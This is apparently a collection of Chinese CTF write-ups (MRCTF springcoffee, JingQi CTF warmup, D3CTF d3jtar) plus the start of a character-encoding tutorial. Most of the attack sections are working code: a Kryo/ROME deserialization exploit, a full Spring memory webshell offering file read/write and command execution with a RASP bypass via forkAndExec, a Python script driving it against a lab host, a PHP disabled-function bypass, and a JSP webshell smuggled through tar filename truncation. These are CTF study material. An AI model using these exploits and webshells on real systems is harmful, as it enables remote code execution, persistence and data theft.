解决我不太能讲清楚，这里直接给\n&quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;\n\n可以去看Y4的文章，写的比较清楚\n最终的payload：\n&quot;polish&quot;: True,&quot;References&quot;: True,&quot;RegistrationRequired&quot;: False,&quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;\n\n这里还多出来一个References，这个很多文章里没写，但是必须要加，我从官方EXP里面看到的。但是具体原因不知道，如果有人知道了可以给我留言。\nkryo反序列化到此为止，EXP：\nimport com.esotericsoftware.kryo.Kryo;import com.esotericsoftware.kryo.io.Input;import com.esotericsoftware.kryo.io.Output;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ObjectBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.compiler.Template;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import fun.mrctf.springcoffee.model.ExtraFlavor;import javassist.ClassPool;import org.json.JSONObject;import org.springframework.aop.target.HotSwappableTargetSource;import tools.Evil;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.FileOutputStream;import java.io.IOException;import java.lang.reflect.Array;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;import java.util.HashMap;public class KryoSer &#123;    protected Kryo kryo = new Kryo();    public String ser(String raw) throws Exception &#123;        JSONObject serializeConfig = new JSONObject(raw);        if (serializeConfig.has(&quot;polish&quot;) &amp;&amp; serializeConfig.getBoolean(&quot;polish&quot;)) &#123;            this.kryo = new Kryo();            for (Method setMethod : this.kryo.getClass().getDeclaredMethods()) &#123;                if (setMethod.getName().startsWith(&quot;set&quot;)) &#123;                    try &#123;                        Object p1 = serializeConfig.get(setMethod.getName().substring(3));                        if (!setMethod.getParameterTypes()[0].isPrimitive()) &#123;                            try &#123;                                setMethod.invoke(this.kryo, Class.forName((String) p1).newInstance());                            &#125; catch (Exception e) &#123;                                e.printStackTrace();                            &#125;                        &#125; else &#123;                            setMethod.invoke(this.kryo, p1);                        &#125;                    &#125; catch (Exception e2) &#123;                    &#125;                &#125;            &#125;        &#125;        byte[] bytecode = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();        TemplatesImpl templates = new TemplatesImpl();        setFieldValue(templates, &quot;_class&quot;, null);        setFieldValue(templates, &quot;_name&quot;, &quot;1diOt9&quot;);        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());        byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\java-challenges\\\\MRCTF\\\\MRCTF2022\\\\springcoffee\\\\target\\\\classes\\\\memshell\\\\SpringBootController_Higher2_6_0.class&quot;));        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;bytes&#125;);        ToStringBean toStringBean1 = new ToStringBean(Templates.class, templates);        //防止在put时触发        EqualsBean equalsBean1 = new EqualsBean(String.class, &quot;any&quot;);        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();        hashMap1.put(equalsBean1, &quot;any&quot;);        setFieldValue(equalsBean1, &quot;obj&quot;, toStringBean1);        setFieldValue(equalsBean1, &quot;beanClass&quot;, ToStringBean.class);        //固定写法，初始化SignedObject        KeyPairGenerator keyPairGenerator;        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);        keyPairGenerator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);        SignedObject signedObject = new SignedObject(hashMap1,privateKey,signingEngine);//        signedObject.getObject();        ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, signedObject);        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean2);        // 为防止 put 时提前命令执行，这里先不设置，随便 new 一个 HashMap 做参数        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new HashMap&lt;&gt;());        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();        hashMap2.put(h1, &quot;test1&quot;);        hashMap2.put(h2, &quot;test2&quot;);        // 反射设置 this.target 为 XString 对象        setFieldValue(h2, &quot;target&quot;, new XString(&quot;test&quot;));        setFieldValue(toStringBean2, &quot;obj&quot;, signedObject);        setFieldValue(toStringBean2, &quot;beanClass&quot;, SignedObject.class);        ByteArrayOutputStream baos = new ByteArrayOutputStream();        Output output = new Output(baos);        this.kryo.writeClassAndObject(output, hashMap2);        output.close();        return new String(Base64.getEncoder().encode(baos.toByteArray()));    &#125;    public void deser(String s)&#123;        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(s));        Input input = new Input(bais);        this.kryo.readClassAndObject(input);    &#125;    public static void main(String[] args) throws Exception &#123;        KryoSer kryoSer = new KryoSer();        String raw = &quot;&#123;\\&quot;polish\\&quot;:true,\\&quot;References\\&quot;: True,\\&quot;RegistrationRequired\\&quot;:false,\\&quot;InstantiatorStrategy\\&quot;: \\&quot;org.objenesis.strategy.StdInstantiatorStrategy\\&quot;&#125;&quot;;        String ser = kryoSer.ser(raw);        new FileOutputStream(&quot;D:\\\\tmp\\\\payload.txt&quot;).write(ser.getBytes());//        kryoSer.deser(ser);    &#125;    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException &#123;        Class&lt;?&gt; aClass = obj.getClass();        Field field = null;        while (aClass != null) &#123;            try&#123;                field = aClass.getDeclaredField(fieldName);                break;            &#125; catch (NoSuchFieldException e) &#123;                aClass = aClass.getSuperclass();            &#125;        &#125;        field.setAccessible(true);        field.set(obj, value);    &#125;&#125;\n\n\n\n内存马编写第一次自己写内存马用，当时也是出了很多问题，不过后来也是跟着文章搞好了\nLandGrey’s Blog\nSpring内存马学习 | Bmth’s blog\n跟着这两篇文章写好了，主要是SpringBoot以2.6.0为分界，Controller的注册方法有点不一样。成功以后自己再去加各种功能就很方便了，这里展示的是最完整的内存马：\npackage memshell;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.tomcat.util.http.fileupload.IOUtils;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import sun.misc.Unsafe;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.net.URL;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;//Memshell when SpringBoot&gt;=2.6.0public class SpringBootController_Higher2_6_0 extends AbstractTranslet &#123;    static&#123;        try &#123;            System.out.println(&quot;start static SpringBootController_Higher2_6_0&quot;);            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);            Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;);            configField.setAccessible(true);            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);            Method declaredMethod = Class.forName(&quot;memshell.SpringBootController_Higher2_6_0&quot;).getDeclaredMethod(&quot;login&quot;, HttpServletRequest.class, HttpServletResponse.class);            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();            RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;).options(config).build();            mappingHandlerMapping.registerMapping(info, Class.forName(&quot;memshell.SpringBootController_Higher2_6_0&quot;).newInstance(), declaredMethod);            System.out.println(&quot;SpringBootController_Higher2_6_0 is been registered&quot;);        &#125; catch (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException |                 NoSuchFieldException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public SpringBootController_Higher2_6_0() &#123;        System.out.println(&quot;SpringBootController_Higher2_6_0 no args constructor is been used&quot;);    &#125;    public void login(HttpServletRequest request, HttpServletResponse response) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException, NoSuchMethodException, InvocationTargetException &#123;        try &#123;            PrintWriter writer = response.getWriter();            //任意文件写入            String writePath = request.getParameter(&quot;writePath&quot;);            String writeBytes = request.getParameter(&quot;writeBase64&quot;);            if (writePath != null &amp;&amp; writeBytes != null) &#123;                byte[] decode = Base64.getDecoder().decode(writeBytes);                new FileOutputStream(writePath).write(decode);            &#125;            //文件下载            String filePath = request.getParameter(&quot;file&quot;);            if (filePath != null) &#123;                byte[] bytes = Files.readAllBytes(Paths.get(filePath));                String s = Base64.getEncoder().encodeToString(bytes);                writer.write(s);            &#125;            //读文件，不会触发Runtime等            String urlContent = &quot;&quot;;            String read = request.getParameter(&quot;read&quot;);            if (read != null) &#123;                final URL url = new URL(read);                final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));                String inputLine = &quot;&quot;;                while ((inputLine = in.readLine()) != null) &#123;                    urlContent = urlContent + inputLine + &quot;\\n&quot;;                &#125;                in.close();                writer.println(urlContent);            &#125;            String arg0 = request.getParameter(&quot;code&quot;);//            命令执行ProcessImpl            if (arg0 != null) &#123;                String o = &quot;&quot;;                java.lang.ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, arg0&#125;);                &#125;else&#123;                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, arg0&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;            String[] strs = request.getParameterValues(&quot;cmd&quot;);            //通过forkAndExec命令执行            if (strs != null) &#123;                Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);                theUnsafeField.setAccessible(true);                Unsafe unsafe = (Unsafe) theUnsafeField.get(null);                Class processClass = null;                try &#123;                    processClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);                &#125; catch (ClassNotFoundException e) &#123;                    processClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);                &#125;                Object processObject = unsafe.allocateInstance(processClass);                // Convert arguments to a contiguous block; it&#x27;s easier to do                // memory management in Java than in C.                byte[][] args = new byte[strs.length - 1][];                int size = args.length; // For added NUL bytes                for (int i = 0; i &lt; args.length; i++) &#123;                    args[i] = strs[i + 1].getBytes();                    size += args[i].length;                &#125;                byte[] argBlock = new byte[size];                int i = 0;                for (byte[] arg : args) &#123;                    System.arraycopy(arg, 0, argBlock, i, arg.length);                    i += arg.length + 1;                    // No need to write NUL bytes explicitly                &#125;                int[] envc = new int[1];                int[] std_fds = new int[]&#123;-1, -1, -1&#125;;                Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);                Field helperpathField = processClass.getDeclaredField(&quot;helperpath&quot;);                launchMechanismField.setAccessible(true);                helperpathField.setAccessible(true);                Object launchMechanismObject = launchMechanismField.get(processObject);                byte[] helperpathObject = (byte[]) helperpathField.get(processObject);                int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);                Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;                        int.class, byte[].class, byte[].class, byte[].class, int.class,                        byte[].class, int.class, byte[].class, int[].class, boolean.class                &#125;);                forkMethod.setAccessible(true);// 设置访问权限                int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;                        ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,                        null, envc[0], null, std_fds, false                &#125;);                // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流                Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);                initStreamsMethod.setAccessible(true);                initStreamsMethod.invoke(processObject, std_fds);                // 获取本地执行结果的输入流                Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);                getInputStreamMethod.setAccessible(true);                InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);                ByteArrayOutputStream baos = new ByteArrayOutputStream();                int a = 0;                byte[] b = new byte[1024];                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                writer.write(baos.toString());            &#125;        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125; catch (NoSuchFieldException e) &#123;            throw new RuntimeException(e);        &#125; catch (SecurityException e) &#123;            throw new RuntimeException(e);        &#125; catch (IllegalArgumentException e) &#123;            throw new RuntimeException(e);        &#125; catch (IllegalAccessException e) &#123;            throw new RuntimeException(e);        &#125; catch (ClassNotFoundException e) &#123;            throw new RuntimeException(e);        &#125; catch (InstantiationException e) &#123;            throw new RuntimeException(e);        &#125; catch (InvocationTargetException e) &#123;            throw new RuntimeException(e);        &#125; catch (NoSuchMethodException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static byte[] toCString(String s) &#123;        if (s == null)            return null;        byte[] bytes  = s.getBytes();        byte[] result = new byte[bytes.length + 1];        System.arraycopy(bytes, 0,                result, 0,                bytes.length);        result[result.length - 1] = (byte) 0;        return result;    &#125;    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;\n\n一开始其实注入的就是一个最普通的内存马，后来发现没法执行命令。于是增加了目录和文件读取的功能，通过read&#x3D;file:&#x2F;&#x2F;&#x2F;这样的伪协议形式读。然后会发现虽然能知道flag就在根目录下，但是由于权限原因没法直接读取（看dockerfile知道的）。查看app目录，发现有jrasp.jar，再给内存马加功能，把rasp下载下来（读base64编码，python脚本再转换）。\nrasp没学的话可以参考文末的几篇文章。这个rasp禁止了ProcessImpl，但是没禁止UnixProcess，所以我们可以直接通过UnixProcess去执行命令。但是我内存马是直接用forkAndExec去执行了，更底层一点。虽然作者的本意是让我们写JNI文件去命令执行的。\n这样注入后就可以执行命令了，通过readFlag去读。但是这个readFlag是一个算术题，也是需要把文件下载，然后写对应的C语言程序与readFlag交互，最后把写好的C语言程序上传并执行。这个计算题的步骤我当时没复现，感觉有点麻烦。\n最后给一下参考的python脚本：\nimport base64import requestsfrom urllib.parse import quotedef upload_jar_file(url, file_path, headers=None):    &quot;&quot;&quot;    上传 .jar 文件到指定 URL    :param url: 目标服务器的 URL    :param file_path: 要上传的 .jar 文件路径    :param headers: 可选的请求头（如身份验证信息）    :return: 返回服务器响应    &quot;&quot;&quot;    # 检查文件是否存在    try:        with open(file_path, &#x27;rb&#x27;) as file:            files = &#123;&#x27;file&#x27;: (file_path, file, &#x27;application/java-archive&#x27;)&#125;            response = requests.post(url, files=files, headers=headers)            return response    except FileNotFoundError:        print(f&quot;Error: File not found at &#123;file_path&#125;&quot;)        return None    except Exception as e:        print(f&quot;Error: &#123;e&#125;&quot;)        return Nonedef post(url, data=None, json=None, headers=None):    response = requests.post(url, data=data, json=json, headers=headers)    print(response.text)def get(url):    response = requests.get(url)    print(response.text)    return response.textdef readTXT(file_path):    with open(file_path, &#x27;r&#x27;) as file:        return file.read()def readBin(file_path):    with open(file_path, &#x27;rb&#x27;) as file:        return file.read()if __name__ == &#x27;__main__&#x27;:    headers = &#123;        &quot;cmd&quot;: &quot;whoami&quot;,        # &quot;Content-Type&quot;: &quot;application/json&quot;        &quot;Accept&quot;: &quot;text/html;charset=fengfff&quot;,    &#125;    payload = readTXT(&quot;D://tmp//payload.txt&quot;)    data = &#123;        &quot;message&quot;: f&quot;&#123;payload&#125;&quot;    &#125;    url = &quot;http://192.168.21.132:8007/coffee/demo&quot;    json_raw = &#123;        &quot;polish&quot;: True,        &quot;References&quot;: True,        &quot;RegistrationRequired&quot;: False,        &quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;    &#125;    # post(url, json=json_raw)    coffee_json = &#123;        &quot;extraFlavor&quot;: f&quot;&#123;payload&#125;&quot;,        &quot;espresso&quot;: 0.1    &#125;    url2 = &quot;http://192.168.21.132:8007/coffee/order&quot;    # post(url2, json=coffee_json)    bin_base64 = get(&quot;http://192.168.21.132:8007/shell?file=/app/jrasp.jar&quot;)    output_path = &quot;D://tmp//jrasp.jar&quot;    with open(output_path, &#x27;wb&#x27;) as file:        decoded_bin = base64.b64decode(bin_base64)        file.write(decoded_bin)    flag = readBin(&quot;D://flag&quot;)    bwriteBase64 = base64.b64encode(flag)    writeBase64 = bwriteBase64.decode(&quot;utf-8&quot;)    writePath = &quot;/fllag&quot;    get(f&quot;http://192.168.21.132:8007/shell?writePath=&#123;writePath&#125;&amp;writeBase64=&#123;writeBase64&#125;&quot;)\n\n\n\n总结这道题对我来说主要就是实践了一下内存马和rasp绕过，另外还有高版本kryo的绕过。题目很难，大佬们是真厉害\n参考wp：\n2022MRCTF-Java部分\nMRCTF 2022 By W&amp;M - W&amp;M Team\nRASP绕过初探 | Bmth’s blog\nEkiXu&#x2F;My-CTF-Challenge\nkryo：\n[浅析Dubbo Kryo&#x2F;FST反序列化漏洞（CVE-2021-25641）  Mi1k7ea ]\n内存马：\nSpring内存马学习 | Bmth’s blog\nLandGrey’s Blog\nJavaAgent与Rasp：\n浅谈 Java Agent 内存马 – 天下大木头\nJava Agent 内存马学习 | Drunkbaby’s Blog\n[本地命令执行漏洞 · 攻击Java Web应用-Java Web安全]\n文章 - JAVA安全之命令执行研究分析 - 先知社区\n[JNI攻击 · 攻击Java Web应用-Java Web安全]\nJava 反序列化绕过 RASP - DumKiy’s blog\n[java Rasp 的简单实现与绕过 - Ko1sh1’s Blog](https://ko1sh1.github.io/2024/03/25/blog_java Rasp的实现与绕过&#x2F;#JNI-绕过RASP-执行命令)\n","categories":["CTF-Java"],"tags":["Java安全","CTF-Java"]},{"title":"京麒CTF25-热身Web","url":"/2025/05/22/%E4%BA%AC%E9%BA%92CTF25-%E7%83%AD%E8%BA%ABWeb/","content":"Execute考命令执行\n先看一下php版本，这里可以直接执行代码：\n是php7，那么我们知道，这里是支持这种函数执行方式的：\n$a = &quot;system&quot;;$a(&#x27;ls&#x27;);\n\n试了一下，直接成功了：\n可以看一下题目的过滤逻辑：\n&lt;?phpheader(&#x27;Content-Type: text/html; charset=utf-8&#x27;);$max_execution_time = 5;$memory_limit = &#x27;128M&#x27;;$disabled_functions = [    &#x27;exec&#x27;, &#x27;passthru&#x27;, &#x27;shell_exec&#x27;, &#x27;system&#x27;, &#x27;proc_open&#x27;, &#x27;popen&#x27;,    &#x27;curl_exec&#x27;, &#x27;curl_multi_exec&#x27;, &#x27;parse_ini_file&#x27;, &#x27;show_source&#x27;,    &#x27;pcntl_exec&#x27;, &#x27;posix_kill&#x27;, &#x27;posix_mkfifo&#x27;, &#x27;posix_setpgid&#x27;,    &#x27;posix_setsid&#x27;, &#x27;posix_setuid&#x27;, &#x27;posix_setgid&#x27;, &#x27;posix_uname&#x27;,    &#x27;dl&#x27;, &#x27;openlog&#x27;, &#x27;syslog&#x27;, &#x27;closelog&#x27;];ini_set(&#x27;max_execution_time&#x27;, $max_execution_time);ini_set(&#x27;memory_limit&#x27;, $memory_limit);$code = isset($_POST[&#x27;code&#x27;]) ? $_POST[&#x27;code&#x27;] : &#x27;&#x27;;if (empty($code)) &#123;    die(&#x27;错误: 没有提供PHP代码&#x27;);&#125;foreach ($disabled_functions as $func) &#123;    if (preg_match(&#x27;/\\b&#x27; . preg_quote($func, &#x27;/&#x27;) . &#x27;\\s*\\(/i&#x27;, $code)) &#123;        die(&quot;安全错误: 不允许使用 &#123;$func&#125;() 函数&quot;);    &#125;&#125;$dangerous_patterns = [    &#x27;/`.*`/&#x27;,                          // 反引号执行    &#x27;/eval\\s*\\(/i&#x27;,                    // eval函数    &#x27;/create_function\\s*\\(/i&#x27;,         // create_function    &#x27;/include\\s*\\(/i&#x27;,                 // include    &#x27;/require\\s*\\(/i&#x27;,                 // require    &#x27;/include_once\\s*\\(/i&#x27;,            // include_once    &#x27;/require_once\\s*\\(/i&#x27;,            // require_once    &#x27;/file_put_contents\\s*\\(/i&#x27;,       // 文件写入    &#x27;/file_get_contents\\s*\\(/i&#x27;,       // 文件读取    &#x27;/unlink\\s*\\(/i&#x27;,                  // 文件删除    &#x27;/phpinfo\\s*\\(/i&#x27;,                 // phpinfo    &#x27;/chmod\\s*\\(/i&#x27;,                   // 修改权限    &#x27;/chown\\s*\\(/i&#x27;,                   // 修改所有者    &#x27;/chgrp\\s*\\(/i&#x27;,                   // 修改组    &#x27;/putenv\\s*\\(/i&#x27;,                  // 环境变量    &#x27;/ini_set\\s*\\(/i&#x27;,                 // 修改INI设置    &#x27;/extract\\s*\\(/i&#x27;,                 // extract    &#x27;/parse_str\\s*\\(/i&#x27;,               // parse_str    &#x27;/assert\\s*\\(/i&#x27;,                  // assert    &#x27;/preg_replace\\s*\\(.*\\/e.*\\)/i&#x27;,   // preg_replace /e修饰符    &#x27;/proc_terminate\\s*\\(/i&#x27;,          // 进程终止    &#x27;/pcntl_fork\\s*\\(/i&#x27;,              // 进程控制    &#x27;/posix_getpwuid\\s*\\(/i&#x27;,          // 获取用户信息    &#x27;/posix_kill\\s*\\(/i&#x27;,              // 发送信号    &#x27;/posix_setuid\\s*\\(/i&#x27;,            // 设置UID    &#x27;/posix_setgid\\s*\\(/i&#x27;             // 设置GID];foreach ($dangerous_patterns as $pattern) &#123;    if (preg_match($pattern, $code)) &#123;        die(&quot;安全错误: 检测到潜在的危险操作&quot;);    &#125;&#125;ob_start();$old_error_reporting = error_reporting(E_ALL);$old_display_errors = ini_set(&#x27;display_errors&#x27;, &#x27;1&#x27;);try &#123;    eval(&#x27;?&gt;&#x27; . $code);&#125; catch (ParseError $e) &#123;    echo &quot;解析错误: &quot; . $e-&gt;getMessage() . &quot;\\n&quot;;    echo &quot;位于行: &quot; . $e-&gt;getLine() . &quot;\\n&quot;;&#125; catch (Throwable $e) &#123;    echo &quot;运行时错误: &quot; . $e-&gt;getMessage() . &quot;\\n&quot;;    echo &quot;位于行: &quot; . $e-&gt;getLine() . &quot;\\n&quot;;&#125;error_reporting($old_error_reporting);ini_set(&#x27;display_errors&#x27;, $old_display_errors);$output = ob_get_clean();$sensitive_patterns = [    &#x27;/\\/home\\/.*/i&#x27;,    &#x27;/\\/var\\/www\\/.*/i&#x27;,    &#x27;/\\[internal function\\]/i&#x27;];foreach ($sensitive_patterns as $pattern) &#123;    $output = preg_replace($pattern, &#x27;[隐藏信息]&#x27;, $output);&#125;echo htmlspecialchars($output, ENT_QUOTES, &#x27;UTF-8&#x27;);?&gt;\n\n大概就是通过 ‘system(‘这样的匹配规则来过滤。最底下还会对输出中的敏感目录进行过滤。\nEzlogin可以通过插件或者cookie来判断是一道Java。\n扫一下目录，发现有&#x2F;actuator泄露。简单看一下mapping，env，能发现是一个8u111的环境。\n然后开始用heapdump，先getfile看一下依赖：\n可以看到有shiro和cc3.2.1，下面还有一个cb1.9.4\n查一下shirokey，上面图片最顶上其实已经查了。\n那接下来用java-chain工具一把梭就行。\n记得把GCM模式打开。\n带上cookie，发包即可。不过这里好像对header长度有限制，我生成内存马直接报错了。\nCookie: rememberMe&#x3D; 6ZAFnvTDGFQNmw2R2x4S8+bF。。。\n总结题目比较简单，但是题目的环境都挺好的，看着很舒服。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"D3CTF-d3jtar","url":"/2025/06/01/D3CTF-d3jtar/","content":"比赛的时候没做出来，现在来复现一下。\n在TarHeader类中有两个方法，负责对文件名进行解析。\n这个是压缩时的方法：\npublic static int getNameBytes(StringBuffer name, byte[] buf, int offset, int length) &#123;\tint i;\tfor (i = 0; i &lt; length &amp;&amp; i &lt; name.length(); ++i) &#123;\t\tbuf[offset + i] = (byte) name.charAt(i);\t&#125;\tfor (; i &lt; length; ++i) &#123;\t\tbuf[offset + i] = 0;\t&#125;\treturn offset + length;&#125;\n\n\n\n这个是解压时的方法：\npublic static StringBuffer parseName(byte[] header, int offset, int length) &#123;    StringBuffer result = new StringBuffer(length);    int end = offset + length;    for (int i = offset; i &lt; end; ++i) &#123;       if (header[i] == 0)          break;       result.append((char) header[i]);    &#125;    return result;&#125;\n\n\n\n这里重点关注一下压缩时的方法。可以看到，这里对文件名name，进行了 (byte) name.charAt(i) 操作。name.charAt()得到是char类型数据，占16位，默认实现UTF-16，是Unicode码点序列。而byte类型只占8位。这就导致name中的中文在转化成byte类型时，会丢失高位部分。因此，现在要做的就是找到一个Unicode字符，其丢失高位后与jsp中的任意一个字符相同。\n这里以 j 为例。\npackage solution;public class Test &#123;    public static void main(String[] args) &#123;        StringBuffer name = new StringBuffer();        name.append(&quot;你abc123&quot;);        char c = name.charAt(0);        System.out.println(c);        System.out.println((byte) c);        System.out.println((byte) &#x27;j&#x27;);        unicodeSearch();    &#125;    public static void unicodeSearch()&#123;        int count = 0;        for (int codePoint = Character.MIN_CODE_POINT; codePoint &lt;= Character.MAX_CODE_POINT; codePoint++) &#123;            if (!Character.isDigit(codePoint)) &#123;                continue;            &#125;            String s = new String(Character.toChars(codePoint));            char c = s.charAt(0);            if ((byte) c == 106)&#123;                System.out.println(String.format(&quot;%c: U+%04X%n&quot;, c, codePoint));            &#125;        &#125;    &#125;&#125;\n\npython脚本也行：\nif __name__ == &quot;__main__&quot;:    for i in range(0x0000, 0xFFFF+1):        hex_str = format(i, &quot;04x&quot;)        last2 = hex_str[-2:]        char_old = chr(int(hex_str, 16))        char_new = chr(int(last2, 16))        if char_new == &#x27;j&#x27;:            print(f&quot;&#123;char_old&#125;丢失高位后变成：&#123;char_new&#125;&quot;)\n\n找到一些能用的字符\nŪ(\\u016a)丢失高位后变成：j\nɪ(\\u026a)丢失高位后变成：j\nͪ(\\u036a)丢失高位后变成：j\nѪ(\\u046a)丢失高位后变成：j\nժ(\\u056a)丢失高位后变成：j\n٪(\\u066a)丢失高位后变成：j\nݪ(\\u076a)丢失高位后变成：j\nࡪ(\\u086a)丢失高位后变成：j\n४(\\u096a)丢失高位后变成：j\n创建jsp马即可：\npackage solution;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;public class WriteJsp &#123;    public static void main(String[] args) throws IOException &#123;        FileOutputStream fos = new FileOutputStream(&quot;shell.\\u096Asp&quot;);        fos.write((&quot;&lt;%@ page import=\\&quot;java.io.InputStream\\&quot; %&gt;\\n&quot; +                &quot;&lt;%@ page import=\\&quot;java.util.Scanner\\&quot; %&gt;&lt;%\\n&quot; +                &quot;    Process env = Runtime.getRuntime().exec(\\&quot;env\\&quot;);\\n&quot; +                &quot;    InputStream inputStream = env.getInputStream();\\n&quot; +                &quot;    Scanner scanner = new Scanner(inputStream).useDelimiter(\\&quot;\\\\\\\\A\\&quot;);\\n&quot; +                &quot;    String s = scanner.hasNext() ? scanner.next() : \\&quot;\\&quot;;\\n&quot; +                &quot;    out.print(s);\\n&quot; +                &quot;%&gt;&quot;).getBytes());    &#125;&#125;","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"编码方式学习","url":"/2025/06/03/%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/","content":"前言学一下utf8等编码方式。\n相信大家都接触过乱码文本，就是锟斤拷之类的，这个就是由编码问题导致的。而编码问题的本质，就是用不同的方式读同一段字节，有些可能两个两个字节读，有些可能四个四个字节读。\n在CTF里，遇到过UTF8 Overlong Encoding 绕过，也遇到过由于高字节丢弃产生的绕过，但由于对缺乏对编码的知识，所以不是很理解，因此现在来学习一下。\nUTF8UTF-8 是一种可变长度的 Unicode 编码方式，使用 1~4 个字节 表示一个字符，兼容 ASCII，并广泛用于互联网和文件存储。它的设计目标是节省空间（英文字符仅需 1 字节），同时支持所有 Unicode 字符（包括中文、emoji 等）。\n\nUTF-8 的编码规则UTF-8 的编码方式根据 Unicode 码点（Code Point）的范围，采用不同长度的字节序列：\n\n\n\nUnicode 码点范围（十六进制）\n码点位数\nUTF-8 字节序列格式（二进制）\n字节数\n示例\n\n\n\nU+0000 ~ U+007F\n7 bits\n0xxxxxxx\n1\n&#39;A&#39; (0x41)\n\n\nU+0080 ~ U+07FF\n11 bits\n110xxxxx 10xxxxxx\n2\n&#39;é&#39; (0xC3A9)\n\n\nU+0800 ~ U+FFFF\n16 bits\n1110xxxx 10xxxxxx 10xxxxxx\n3\n&#39;你&#39; (0xE4BDA0)\n\n\nU+10000 ~ U+10FFFF\n21 bits\n11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\n4\n&#39;𠀀&#39; (0xF0A08080)\n\n\n编码步骤\n确定码点范围 → 选择对应的 UTF-8 字节格式。\n将 Unicode 码点转换为二进制，填充到 UTF-8 的模板中。\n转换为十六进制字节，得到最终的 UTF-8 编码。\n\n\n示例：&#39;你&#39; 